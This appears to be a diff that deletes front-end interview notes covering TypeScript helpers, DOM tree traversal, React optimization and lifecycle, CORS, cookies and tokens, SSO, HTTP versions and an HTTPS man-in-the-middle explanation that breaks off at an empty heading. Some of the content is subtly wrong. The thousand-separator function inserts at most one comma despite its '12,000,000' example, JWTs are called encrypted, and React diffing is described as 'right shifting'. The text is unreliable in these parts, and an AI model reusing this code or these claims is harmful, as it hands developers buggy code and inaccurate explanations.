-## formatting numbers into a thousand separator style (e.g., "1,000", "12,000,000")
-```ts
-function format(num: number): string{
-    let res: string = "";
-    const s: string = num.toString();
-    let count: number = 0;
-    for (let i = s.length - 1; i >= 0; i--) {
-        if (++count === 3 && i !== 0) {
-            res = "," + res;
-        }
-        res = s.charAt(i) + res;
-    }
-    return res;
-}
-```
-
-## Switch letter case, e.g. aBc123D -> AbC123d
-```ts
-function switchLetterCase(s: string): string {
-    let res = ""
-
-    // according to ascii table, A-Z is 65-90, a-z is 97-122
-    const UPPER_CASE_A = 65;
-    const UPPER_CASE_Z = 90;
-    const LOWER_CASE_A = 97;
-    const LOWER_CASE_Z = 122;
-
-    for (let i = 0; i < s.length; i++) {
-        const code = s.charCodeAt(i);
-        if (code >= UPPER_CASE_A && code <= UPPER_CASE_Z) {
-            // Convert to lower case
-            res += String.fromCharCode(code + 32); 
-        } else if (code >= LOWER_CASE_A && code <= LOWER_CASE_Z) {
-            // Convert to upper case
-            res += String.fromCharCode(code - 32); 
-        } else {
-            // Non-alphabetic characters are unchanged
-            res += s.charAt(i); 
-        }
-    }
-
-    return res
-}
-```
-
-## Depth-First Search (DFS) of a DOM Tree
-Depth-First Search (DFS) is a method used to traverse or search a tree or graph data structure. The algorithm starts at the root node and explores as far as possible along each branch before backtracking. When applied to a DOM tree, DFS will visit each node in a manner that deeply explores a node's children before moving to its siblings.
-
-### Code Example for DFS
-The given TypeScript function `dfs` illustrates how DFS can be applied to a DOM tree. The `visitNode` function is used to log different types of nodes (Comment, Text, HTMLElement). In the `dfs` function, recursion is utilized to visit each node starting from the root, exploring all its child nodes deeply before moving to the next sibling.
-
-```typescript
-function visitNode(node: Node) {
-    if (node instanceof Comment) {
-        console.log('comment', node.textContent);
-    }
-    if (node instanceof Text) {
-        const t = node.textContent.trim();
-        if (t) {
-            console.log('text', t);
-        }
-    }
-    if (node instanceof HTMLElement) {
-        console.log('element', node.tagName);
-    }
-}
-
-function dfs(node: Node) {
-    visitNode(node);
-    node.childNodes.forEach((child) => {
-        dfs(child);
-    });
-}
-```
-
-### Without Recursion
-DFS can be implemented without recursion by using a stack to simulate the call stack of recursion. This approach avoids potential stack overflow errors that may occur with deep recursion. While recursion is more straightforward and readable, using a stack can be more efficient and safer for deep trees.
-
-```typescript
-function dfsWithoutRecursion(node: Node) {
-    const stack = [node];
-    while (stack.length) {
-        const n = stack.pop();
-        visitNode(n);
-        Array.from(n.childNodes).reverse().forEach((child) => {
-            stack.push(child);
-        });
-    }
-}
-```
-
-## Breadth-First Search (BFS) of a DOM Tree
-Breadth-First Search (BFS) is another method to traverse or search a tree or graph data structure. Unlike DFS, BFS explores all the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level. Applied to a DOM tree, BFS will visit each node level by level.
-
-### Code Example for BFS
-The `bfs` function demonstrates how BFS can be applied to a DOM tree. It uses a queue to visit each node at the current level before moving to the nodes at the next level. This approach ensures that nodes are visited in a breadth-wise manner.
-
-```typescript
-function bfs(node: Node) {
-    const queue = [node];
-    while (queue.length) {
-        const n = queue.shift();
-        visitNode(n);
-        n.childNodes.forEach((child) => {
-            queue.push(child);
-        });
-    }
-}
-```
-
-### Key Differences Between DFS and BFS
-- **DFS** dives as deep as possible into the tree's branches before backtracking, which can be implemented either recursively or using a stack.
-- **BFS** visits all nodes at the current level before moving to the next level, using a queue to keep track of the order.
-
-## Array to Tree and Tree to Array Conversion
-### TreeNode and ArrayItem Interfaces
-```typescript
-interface TreeNode {
-    id: number;
-    name: string;
-    children?: TreeNode[];
-}
-
-interface ArrayItem {
-    id: number;
-    parentId: number;
-    name: string;
-}
-```
-
-### Array to Tree Conversion
-```typescript
-function arrayToTree(arr: ArrayItem[]): TreeNode | null {
-    const map = new Map<number, TreeNode>();
-    let root: TreeNode | null = null;
-
-    // sort by parentId to ensure parent nodes are processed before children
-    arr.sort((a, b) => a.parentId - b.parentId);
-
-    arr.forEach(item => {
-        const {id, parentId, name} = item;
-        const treeNode: TreeNode = {id, name, children: []};
-        map.set(id, treeNode);
-
-        if (parentId === 0) {
-            root = treeNode;
-        } else {
-            const parent = map.get(parentId);
-            parent?.children.push(treeNode);
-        }
-    });
-
-    return root;
-}
-```
-
-### Tree to Array Conversion
-```typescript
-function treeToArray(tree: TreeNode): ArrayItem[] {
-    const result: ArrayItem[] = [];
-
-    function traverse(node: TreeNode, parentId: number) {
-        const {id, name, children} = node;
-        result.push({id, parentId, name});
-        children?.forEach(child => traverse(child, id));
-    }
-
-    traverse(tree, 0);
-    return result;
-}
-```
-
-### Contextual Understanding
-- **Relational Databases**: Such as PostgreSQL, typically store data in a tabular format with rows and columns, which resembles the flat array structure. This format is efficient for operations that involve relations between different entities.
-  
-- **Non-relational Databases**: For instance, MongoDB, often store data in formats akin to the tree structure, like documents in BSON format. This structure is advantageous for storing nested or hierarchical data, such as comments on a post or categories with subcategories.
-# 6. React.md
-
-## Is Virtual DOM (VDOM) fast?
-
-The Virtual DOM (VDOM) is a core concept in modern web development, particularly in frameworks like React and Vue. It's a lightweight representation of the actual DOM (Document Object Model) in the form of JavaScript objects. While the Virtual DOM was popularized by React, it's now widely used across different front-end frameworks due to its advantages in updating user interfaces.
-
-### Understanding Virtual DOM and Its Performance
-
-The speed of the Virtual DOM depends on the context of comparison. When comparing the direct manipulation of the real DOM (as in libraries like jQuery) to the Virtual DOM approach, direct DOM manipulation can be quicker for simple, isolated operations. This is because it involves a direct interaction with the browser's rendering pipeline. However, this approach can become inefficient and less scalable in complex applications.
-
-The Virtual DOM provides an abstraction layer that allows for a more declarative way of defining UI components and their state changes. Here's how it works:
-1. Upon data changes in the application, the UI is re-rendered in the Virtual DOM.
-2. A diffing algorithm compares this new Virtual DOM with the previous snapshot to identify the minimal set of changes needed for the real DOM.
-3. These changes are batched and applied to the real DOM efficiently, reducing direct manipulation and reflow/repaint costs.
-
-### Advantages of Using Virtual DOM
-
-- **Component-Based Architecture**: React and Vue use a component-based structure, encapsulating UI and business logic into reusable components, which enhances development scalability and manageability.
-- **Separation of Concerns**: These frameworks separate the data model from the UI (view), leading to a more predictable data flow and easier state management.
-- **Efficiency in Development**: Developers can concentrate on state management and business logic rather than direct DOM manipulations, resulting in more maintainable code and quicker development cycles.
-
-In conclusion, the Virtual DOM is not inherently faster than direct DOM manipulation for every operation. However, it provides a more efficient and effective approach for dynamic web applications, particularly those with complex interfaces and frequent state changes. Its efficiency stems from reducing the amount of direct DOM manipulation, leading to improved performance in applications where state changes are common.
-
-## What is `window.requestIdleCallback`? What's the difference between `requestIdleCallback` and `requestAnimationFrame`?
-
-`window.requestIdleCallback` is a method that allows developers to queue a function to be executed when the browser is idle. This API provides an opportunity to perform background and low-priority work without interfering with critical animations or input response times. It's particularly useful for tasks that aren't time-critical, such as analytics and background data processing.
-
-### React Fiber
-
-React Fiber is a reimplementation of React's core algorithm. It changes the component tree structure to a linked list, enabling incremental rendering. This means that rendering work can be split into chunks and spread out over multiple frames. Fiber's architecture allows React to pause rendering to handle more urgent tasks and then resume when the browser is idle. This is where `requestIdleCallback` becomes relevant; it provides a native way to schedule these low-priority tasks during idle times, enhancing performance without sacrificing user experience.
-
-However, it's important to note that `requestIdleCallback` may have compatibility issues with Safari and Internet Explorer.
-
-### Difference between `requestIdleCallback` and `requestAnimationFrame`
-
-- **`requestAnimationFrame`** is designed for animations and executes just before each repaint, ensuring smooth visual updates. It has a higher priority because maintaining a high frame rate is crucial for animations and user interface responsiveness.
-- **`requestIdleCallback`**, on the other hand, is intended for tasks that can wait until the main thread is idle. It runs with lower priority, making it suitable for non-urgent tasks that don't need to be completed immediately.
-
-Both `requestAnimationFrame` and `requestIdleCallback` are considered macro tasks in the JavaScript event loop, but they serve different purposes based on their execution timing and priority levels.
-
-## Difference Algorithm and Implementation in React
-
-### Difference Algorithm
-The difference algorithm, often referred to as the "diff" algorithm, plays a crucial role in determining how to update the DOM by comparing two versions of the virtual DOM. Here’s how it works:
-- The algorithm compares components at the same hierarchical level in the virtual DOM tree, avoiding cross-level comparisons.
-- If it detects different tags, it will remove the old component and construct a new one instead of delving into further details.
-- For child components, the comparison is facilitated by unique "keys," which underscore the significance of assigning keys to list items.
-
-### React's Difference Algorithm
-React's diff algorithm employs an efficient strategy known as "right shifting." This means that during a comparison, if elements have only moved backward (to the right) in the list, React will move the elements accordingly instead of recreating them. This approach minimizes unnecessary DOM manipulations, leading to better performance.
-
-### Importance of Keys
-Keys are vital for optimizing the rendering process in React. When keys are provided, React uses them to identify which elements have changed, been added, or been removed. This helps in:
-- Precisely moving elements in the DOM without having to rebuild them, thus saving time and computational resources.
-- Increasing efficiency, especially in dynamic lists where the order of elements might change over time. Without keys, React would have to rebuild the entire list to ensure accuracy, which is far less efficient.
-
-## In practical work, how have you optimized React?
-
-### Modify CSS to simulate v-show
-Using inline CSS to conditionally display components can be optimized to avoid conditional rendering blocks and improve readability:
-
-```ts
-{/* Instead of conditionally rendering the component twice */}
-{!flag && <MyComponent style={{display: 'none'}}/>}
-{flag && <MyComponent />}
-
-// Use a single line with conditional styling
-<MyComponent style={{display: flag ? 'block' : 'none'}} />
-```
-
-### Use keys in loops
-Using a unique `key` prop in a list helps React identify which items have changed, added, or removed, which can improve the performance of list updates:
-
-```ts
-const todoItems = todos.map(todo => 
-    // Avoid using the index as a key if the list can change
-    <li key={todo.id}>
-        {todo.text}
-    </li>
-)
-```
-
-### Use Fragment to reduce DOM depth
-React Fragments allow you to group a list of children without adding extra nodes to the DOM, which can lead to a more performant and cleaner DOM structure:
-
-```ts
-return <>
-    <div>1</div>
-    <div>2</div>
-</>
-```
-
-### Do not define functions in JSX
-Defining functions directly in JSX can lead to performance issues as the function will be recreated on every render. Instead, define your function outside the JSX return statement:
-
-```ts
-// Avoid defining functions directly in the JSX
-<button onClick={() => {...}}>Click Me</button>
-
-// Prefer defining your function outside and referencing it in JSX
-function MyComponent() {
-    const handleClick = () => {...}
-    return <button onClick={handleClick}>Click Me</button>
-}
-```
-
-### Bind `this` in the constructor
-For class components, it's important to bind `this` in the constructor to ensure that `this` refers to the component instance in your event handlers:
-
-```ts
-class MyComponent extends React.Component {
-    constructor(props) {
-        super(props)
-        // Bind this in the constructor
-        this.handleClick = this.handleClick.bind(this)
-    }
-    handleClick() { /* Now `this` refers to the component instance */ }
-    
-    // Arrow functions automatically bind `this` to the class instance
-    handleClick2 = () => { /* Arrow function, no need to bind this */ }
-    
-    render() {
-        return <button onClick={this.handleClick}>Click Me</button>
-    }
-}
-```
-
-### Use shouldComponentUpdate or React.PureComponent
-#### `shouldComponentUpdate`
-
-The `shouldComponentUpdate` method is available in class components and allows you to prevent unnecessary re-renders by manually determining whether a component should update in response to changes in props or state. It receives the next props and state as arguments and returns a boolean value indicating whether React should continue with the rendering process.
-
-Implementing `shouldComponentUpdate` can significantly improve performance, particularly in cases where you know that the UI does not need to update in response to certain changes.
-
-```ts
-class MyComponent extends React.Component {
-  shouldComponentUpdate(nextProps, nextState) {
-    // Only re-render if the next id is different from the current one
-    return nextProps.id !== this.props.id;
-  }
-  
-  render() {
-    return <div>{this.props.id}</div>;
-  }
-}
-```
-
-In the example above, the component will only re-render if the `id` prop changes. This manual comparison can be very efficient but requires careful implementation to avoid missed updates or stale renders.
-
-#### `React.PureComponent`
-
-`React.PureComponent` is a base class for class components that automatically implements `shouldComponentUpdate` with a shallow prop and state comparison. When your component extends `React.PureComponent`, React will shallowly compare the old props and state with the new ones and re-render the component only if there was a change.
-
-This is particularly useful for components that have simple props and state structures where a shallow comparison is sufficient to detect changes.
-
-```ts
-class MyComponent extends React.PureComponent {
-  render() {
-    return <div>{this.props.id}</div>;
-  }
-}
-```
-
-While `React.PureComponent` reduces the need to manually implement `shouldComponentUpdate`, it's important to remember that it performs a shallow comparison. This means it might not work as expected if your props or state include complex data structures like nested objects or arrays that might change internally without changing their identity.
-
-#### `React.memo`
-
-For functional components, which cannot extend `React.PureComponent` or implement `shouldComponentUpdate`, React provides the `React.memo` higher-order component. Similar to `React.PureComponent`, `React.memo` wraps a functional component and adds a memoization feature, performing a shallow comparison of the component's props. If the props are the same as the previous render, React will skip rendering the component and reuse the last rendered result.
-
-```ts
-const MyComponent = React.memo(function MyComponent(props) {
-  return <div>{props.id}</div>;
-});
-```
-
-`React.memo` is a powerful tool for optimizing functional components, especially when they are expected to render often with the same props. For more complex comparison logic, `React.memo` accepts a second argument, a custom comparison function, giving you control over the comparison logic similar to `shouldComponentUpdate`.
-
-```ts
-const MyComponent = React.memo(function MyComponent(props) {
-  // Component body
-}, (prevProps, nextProps) => {
-  // Return true if passing nextProps to render would return
-  // the same result as passing prevProps, false otherwise
-  return prevProps.id === nextProps.id;
-});
-```
-
-## Common Pitfalls Encountered When Using React
-
-### Naming Conventions for Custom Components
-- Custom component names must start with an uppercase letter to differentiate them from native HTML tags. For example, `<Input/>` is a custom component, while `<input/>` refers to the standard HTML input element.
-
-### Wrapping Variables with Braces Inside JSX
-- Variables inside JSX should be wrapped in curly braces `{}`. For instance, `<Input value={value} />` correctly binds the `value` variable to the `Input` component's `value` property.
-
-### Asynchronous `setState`
-- The `setState` function updates the component state asynchronously. This means you should not expect the state to reflect the new value immediately after calling `setState`. For synchronous logic post-state update, use `setState`'s callback function.
-
-## Unified Error Handling in React
-
-### ErrorBoundary Component
-- The `ErrorBoundary` component is used to catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed.
-- It only catches errors in the rendering phase, meaning it does not catch errors in event handlers or asynchronous code.
-- It works in production environments, but in development, React still displays errors in the UI for better debugging experience.
-
-#### Code Example
-
-```typescript
-class ErrorBoundary extends React.Component {
-  constructor(props) {
-    super(props);
-    this.state = { hasError: false };
-  }
-
-  static getDerivedStateFromError(error) {
-    // Update state to render fallback UI on next render
-    console.info('getDerivedStateFromError', error);
-    return { hasError: true };
-  }
-
-  componentDidCatch(error, errorInfo) {
-    // Log the error for further analysis
-    console.error('componentDidCatch', error, errorInfo);
-  }
-
-  render() {
-    if (this.state.hasError) {
-      // Display fallback UI
-      return <h1>Something went wrong.</h1>;
-    }
-    // Render children components if no error
-    return this.props.children; 
-  }
-}
-```
-
-### Handling Errors Outside of ErrorBoundary
-
-#### Event Errors
-- `ErrorBoundary` does not catch errors from DOM events such as `onClick`. You can use `window.onerror` for global error handling or `try...catch` blocks within event handlers.
-
-#### Asynchronous Errors
-- `ErrorBoundary` does not catch errors in asynchronous operations like `setTimeout`. Similar to event errors, use `window.onerror` or specific error handling logic in your asynchronous code.
-
-#### Extension: Unhandled Promise Rejections
-- Use the `window.onunhandledrejection` event to listen for unhandled promise rejections, providing an opportunity to handle these and prevent the application from crashing.
-
-### Error Reporting and Monitoring
-- Implementing error reporting and monitoring (also known as error tracking or logging) is crucial for understanding and improving the stability of a React application. This involves capturing errors, logging them to a server, and analyzing them to fix bugs or improve application UX.
-
-## React Lifecycle
-The React component lifecycle refers to the series of events that occur from the moment a component is initially rendered until it is finally destroyed. Understanding these lifecycle events is crucial for creating efficient and effective React applications. The lifecycle can be divided into three main phases:
-
-### Mounting
-Mounting is the phase in which a React component is being inserted into the DOM (Document Object Model). It encompasses the following lifecycle methods:
-- `constructor()`: This method is called before anything else, when the component is initiated. It's commonly used to initialize state or bind event handlers.
-- `static getDerivedStateFromProps()`: This method is called right before rendering the component in both the mounting and the updating phase. It's used to update the state based on changes in props over time.
-- `render()`: The render method is the only required method in a class component. It examines `this.props` and `this.state` and returns one of the following types: React elements, Arrays and fragments, Portals, String and numbers, Booleans or null.
-- `componentDidMount()`: This method is called after the component is mounted to the DOM. It's used for DOM manipulation, fetching data from a remote endpoint, and setting up subscriptions (e.g., listeners).
-
-### Updating
-The updating phase occurs when a component's state or props change, leading to a re-render of the component. This phase includes several key lifecycle methods:
-- `static getDerivedStateFromProps()`: As in the mounting phase, this method is called before the render method and is used to update the state based on changes in props.
-- `shouldComponentUpdate()`: This method allows you to decide whether or not React should continue with the rendering process. By returning `true` or `false`, you can optimize component performance.
-- `render()`: The render method is called again to re-render the UI based on the new props or state.
-- `getSnapshotBeforeUpdate()`: This method is called right before the changes from the virtual DOM are to be reflected in the DOM. It can return a value that will be passed to `componentDidUpdate()`.
-- `componentDidUpdate()`: Called after the update has been rendered and reflected in the DOM. It's used for DOM updates, fetching new data, and re-setup of subscriptions if needed.
-
-### Unmounting
-The unmounting phase occurs when a component is being removed from the DOM. It includes one main lifecycle method:
-- `componentWillUnmount()`: This method is called right before a component is destroyed and removed from the DOM. It's used to perform any necessary cleanup, such as invalidating timers, canceling network requests, or cleaning up any subscriptions made in `componentDidMount()`.
-# 4. Network Systems.md
-
-## Tell the difference of Ajax, Fetch and Axios
-
-Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.
-
-Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.
-
-### Ajax (Asynchronous JavaScript and XML)
-
-1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 
-
-2. **Code Example**:
-   ```javascript
-   var xhttp = new XMLHttpRequest();
-   xhttp.onreadystatechange = function() {
-       if (this.readyState == 4 && this.status == 200) {
-          document.getElementById("demo").innerHTML = this.responseText;
-       }
-   };
-   xhttp.open("GET", "ajax_info.txt", true);
-   xhttp.send();
-   ```
-
-### Fetch API
-
-1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.
-
-2. **Code Example**:
-   ```javascript
-   fetch('https://api.example.com/data')
-     .then(response => response.json())
-     .then(data => console.log(data))
-     .catch(error => console.error('Error:', error));
-   ```
-
-### Axios
-
-1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 
-
-2. **Code Example**:
-   ```javascript
-   axios.get('https://api.example.com/data')
-     .then(response => {
-       console.log(response.data);
-     })
-     .catch(error => {
-       console.error('Error:', error);
-     });
-   ```
-
-## Describe TCP 3-way handshake and 4-way termination
-### TCP 3-Way Handshake (Connection Establishment)
-1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
-2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
-3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.
-
-### TCP 4-Way Termination (Connection Termination)
-1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
-2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
-3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
-4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.
-
-## Why send options request when using HTTP cross origin?
-
-### Understanding the Importance of OPTIONS Requests in Cross-Origin HTTP Communication
-
-1. **Same-Origin Policy**: A fundamental security concept in web development, the same-origin policy restricts how a document or script loaded from one origin can interact with resources from another origin. This policy is implemented by web browsers to prevent potentially malicious scripts on one website from obtaining access to sensitive data on another website. A same origin is defined by matching the protocol, domain, and port of the two resources.
-
-2. **Cross-Origin Resource Sharing (CORS)**: CORS is a mechanism that allows many resources (e.g., fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the first resource was served. It's a way for servers to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources.
-
-3. **OPTIONS Preflight Request**: In CORS, an OPTIONS preflight request is automatically sent by the browser to determine whether the cross-origin request is safe to send. This preflight checks if the server will accept the actual request, based on its CORS policy. This request includes methods like GET, POST, or custom headers that might be used in the actual request.
-
-4. **Cross-Origin Requests without Preflight**: Not all cross-origin requests need a preflight. Simple requests, like using GET or POST with certain headers, might not trigger this preflight check. However, more complex requests, especially those using methods like PUT or DELETE, or containing custom headers, generally require a preflight check.
-
-### CORS Solutions
-
-**Solution 1: JSONP Approach**
 ```html
-<!-- On the client side -->
-<script>
-    window.onSuccess = function (data) {
-        console.log(data);
-    }
-</script>
-<script src="https://www.example.com/api/getData"></script>
-```
-In the JSONP (JSON with Padding) approach, a `<script>` tag is used to bypass the same-origin policy. The external script contains a function call with the desired data. While this method can circumvent CORS restrictions, it's limited in functionality and security.
-
-**Solution 2: Server-Side CORS Configuration (Preferred)**
-```javascript
-// Server-side configuration for CORS
-response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011"); // or use '*' for all origins
-response.setHeader("Access-Control-Allow-Headers", "X-Requested-With");
-response.setHeader("Access-Control-Allow-Methods", "PUT, POST, GET, DELETE, OPTIONS");
-response.setHeader("Access-Control-Allow-Credentials", "true"); // Allow cookies
-```
-This approach involves configuring the server to send appropriate CORS headers, allowing requests from specific origins or methods. It's the preferred method for handling cross-origin requests as it provides better control and security.
-
-### Conclusion
-An OPTIONS request is vital in the CORS process to ensure secure cross-origin communication. It helps browsers determine whether the server's CORS policy permits the actual request, thus enhancing web security by allowing servers to specify who can access their resources and how.
-
-## What is Restful API
-RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.
-
-## What is the difference between a token and a cookie in web requests?
-
-### Cookie
-A cookie is a small piece of data sent from a website and stored on the user's computer by the web browser while browsing. Cookies enable websites to remember stateful information (such as items in a shopping cart) or to record browsing activities (like logging in or visiting pages). They are also used to recall information entered into form fields, such as names and addresses.
-
-- Cookies help maintain a user's session by being included in every request to identify the session due to HTTP's stateless nature.
-- Servers send a "Set-Cookie" header to the client, with cookies limited to 4KB.
-- Cookies are subject to Same-Origin Policy (SOP), preventing them from being shared across different origins.
-- Before HTML5, cookies were used for data storage, but LocalStorage and SessionStorage are now preferred.
-
-### Modern Browser Restrictions on Third-Party Cookies
-Modern browsers are limiting or blocking third-party cookies to improve privacy. This is aimed at reducing third-party ads and trackers that invade privacy, separate from the Same-Origin Policy.
-
-### Cookie and Session
-- **Cookies** are used for login authentication, storing identifiers like a user ID.
-- **Sessions** are server-side storage of user information linked to cookie identifiers.
-- Cookies and sessions together maintain authenticated states across web requests. The process typically involves the client sending credentials, the server updating the session and setting a cookie, and subsequent requests being personalized and secure based on the cookie.
-
-### Token
-- Tokens, unlike cookies, are not part of the HTTP standards and can be customized. They need manual storage, such as in LocalStorage.
-- Tokens are not automatically managed by browsers and must be manually set and sent in headers, for example, as "Authorization: Bearer <token>".
-- Unlike cookies, tokens do not have inherent CORS limitations.
-- **JWT (JSON Web Token)** is a common type of token that involves the backend authenticating a login request and returning an encrypted string token, which the client stores and includes in the header of subsequent requests.
-
-### Follow up: Session vs Token, which is better
-The choice between session and token-based authentication depends on the specific requirements and constraints of the application.  
-For applications prioritizing server control over user sessions, quick user management actions, and where server resources are not a major concern, session-based authentication may be preferred.  
-For applications requiring scalability across multiple servers, reduced server load, and flexibility in handling requests from various domains (thus minimizing CORS issues), token-based authentication is often the better choice.  
-Both approaches have their merits and drawbacks, and the decision should align with the application's architectural needs, security requirements, and expected user load.  
-
-### Follow up: How to Achieve SSO (Single Sign-On)?
-
-Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:
-
-1. **Client Side Accesses System A**: The user tries to access System A.
-2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
-3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
-4. **SSO Login Request**: The SSO provider requests the client to log in.
-5. **Client Side Login**: The user logs in to the SSO provider.
-6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
-7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
-8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
-9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
-10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
-11. **Data Returned to Client Side**: System A returns the requested data to the client.
-
-**Key Concepts Related to SSO:**
-
-- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
-- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
-- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.
-
-**Benefits of SSO:**
-
-- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
-- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
-- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.
-
-## Difference between HTTP and UDP
-
-HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.
-
-### HTTP
-- **Layer**: Application
-- **Connection**: Connection-oriented
-- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
-- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
-- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.
-
-### UDP
-- **Layer**: Transport
-- **Connection**: Connectionless
-- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
-- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
-- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.
-
-#### OSI Model Layers
-1. Application Layer
-2. Presentation Layer
-3. Session Layer
-4. Transport Layer (TCP, UDP)
-5. Network Layer
-6. Data Link Layer
-7. Physical Layer
-
-#### TCP/IP Model Layers
-1. Application Layer (HTTP, DNS, SMTP)
-2. Transport Layer (TCP, UDP)
-3. Internet Layer (IP)
-4. Network Interface Layer
-
-### Follow-up: Difference between HTTP 1.0, 1.1, and 2.0
-
-#### HTTP 1.0
-- **Features**: Basic protocol supporting GET and POST methods.
-- **Connection**: Each request opens a new TCP connection, leading to overhead and latency.
-
-#### HTTP 1.1
-- **Features**: Introduced more sophisticated caching mechanisms (Cache-Control, ETag), persistent connections (`Connection: keep-alive`) to allow multiple requests over a single connection, range requests, and additional methods like PUT and DELETE for RESTful APIs.
-- **Performance**: Reduced latency by reusing connections, introduced chunked transfer encoding for dynamic content.
-
-#### HTTP 2.0
-- **Features**: Significantly improved performance through header compression (reducing overhead), multiplexing (allowing multiple requests and responses to be in flight simultaneously over a single TCP connection), and server push capabilities.
-- **Adoption**: Increasingly widespread, offering substantial efficiency improvements over HTTP/1.x.
-
-### Clarifications and Corrections
-- The OSI model does not include a "web layer" but rather a network layer.
-- The TCP/IP model simplifies the OSI layers into four layers, focusing on the internet protocol suite.
-- HTTP 2.0 is not "the newest version" as HTTP/3 is emerging, utilizing QUIC (a transport layer network protocol) over UDP for even better performance in certain conditions.
-
-## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?
-
-A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.
-
-### Symmetrical Encryption
-Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.
-
-### Asymmetrical Encryption
-Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.
-
-### HTTPS Encryption Process
-- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
-- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
-  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
-  2. The server decrypts the received key using its private key.
-  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.
-
-The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.
-
-### Man-in-the-Middle Attack
-During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.
-
-### Prevention Measures
